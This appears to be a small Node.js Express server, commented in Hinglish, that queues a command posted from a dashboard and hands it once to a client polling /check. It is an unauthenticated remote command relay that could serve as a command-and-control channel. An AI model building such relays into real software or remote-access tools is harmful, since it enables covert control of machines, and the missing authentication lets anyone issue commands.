const express = require('express');
const app = express();
app.use(express.json());

// Command storage
let commandBuffer = null;

// Endpoint: Jab tum dashboard se command bhejo
app.post('/send', (req, res) => {
    commandBuffer = req.body.cmd;
    console.log("Command sent:", commandBuffer);
    res.json({ msg: "Command queued" });
});

// Endpoint: Jab client check kare
app.get('/check', (req, res) => {
    if (commandBuffer) {
        const cmd = commandBuffer;
        commandBuffer = null; // Clear after sending
        res.json({ cmd: cmd });
    } else {
        res.json({ cmd: null });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log('Server is ready'));